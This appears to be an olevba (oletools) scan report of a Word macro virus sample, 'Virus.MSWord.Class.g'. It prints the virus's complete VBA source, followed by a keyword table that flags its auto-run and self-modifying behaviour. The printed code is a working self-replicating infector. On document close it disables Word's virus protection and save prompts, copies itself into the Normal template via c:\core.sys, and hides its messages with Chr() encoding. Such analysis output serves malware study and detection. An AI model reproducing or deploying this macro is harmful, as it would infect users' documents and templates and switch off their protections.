olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.g-2318a7867a6c9cabac2a0d3c6b033c8a519e9063
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.g-2318a7867a6c9cabac2a0d3c6b033c8a519e9063 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/23/01 9:05:37 PM00016075
On Error GoTo out
'Tester2/23/01 9:05:37 PM00016075
Options.VirusProtection = False
'Tester2/23/01 9:05:37 PM00016075
Options.SaveNormalPrompt = False
'Tester2/23/01 9:05:37 PM00016075
Options.ConfirmConversions = False
'Tester2/23/01 9:05:37 PM00016075
cores = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 9:05:37 PM00016075
corer = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 9:05:37 PM00016075
If corer > 70 And cores > 0 Then GoTo out
'Tester2/23/01 9:05:37 PM00016075
If corer < 70 Then
'Tester2/23/01 9:05:37 PM00016075
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/23/01 9:05:37 PM00016075
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/23/01 9:05:37 PM00016075
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\core.sys"
'Tester2/23/01 9:05:37 PM00016075
End If
'Tester2/23/01 9:05:37 PM00016075
If cores = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/23/01 9:05:37 PM00016075
Infection = Int(Rnd * 100)
'Tester2/23/01 9:05:37 PM00016075
If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(111) + Chr(82) + Chr(101) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Tester2/23/01 9:05:37 PM00016075
If Day(Now) = 13 And (Month(Now) > 11) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Tester2/23/01 9:05:37 PM00016075
host.codemodule.AddFromFile ("c:\core.sys")
'Tester2/23/01 9:05:37 PM00016075
With host.codemodule
'Tester2/23/01 9:05:37 PM00016075
    For x = 1 To 4
'Tester2/23/01 9:05:37 PM00016075
    .deletelines 1
'Tester2/23/01 9:05:37 PM00016075
    Next x
'Tester2/23/01 9:05:37 PM00016075
End With
'Tester2/23/01 9:05:37 PM00016075
If corer < 70 Then
'Tester2/23/01 9:05:37 PM00016075
    With host.codemodule
'Tester2/23/01 9:05:37 PM00016075
    .replaceline 1, "Sub AutoClose()"
'Tester2/23/01 9:05:37 PM00016075
    .replaceline 75, "Sub ToolsMacro()"
'Tester2/23/01 9:05:37 PM00016075
    End With
'Tester2/23/01 9:05:37 PM00016075
End If
'Tester2/23/01 9:05:37 PM00016075
With host.codemodule
'Tester2/23/01 9:05:37 PM00016075
    For x = 2 To 72 Step 2
'Tester2/23/01 9:05:37 PM00016075
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 9:05:37 PM00016075
    Next x
'Tester2/23/01 9:05:37 PM00016075
End With
'Tester2/23/01 9:05:37 PM00016075
out:
'Tester2/23/01 9:05:37 PM00016075
If corer > 70 And cores = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 9:05:37 PM00016075
End Sub

Sub ToolsMacro()
'Word97/Core by Virus, Thanks Vic.
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

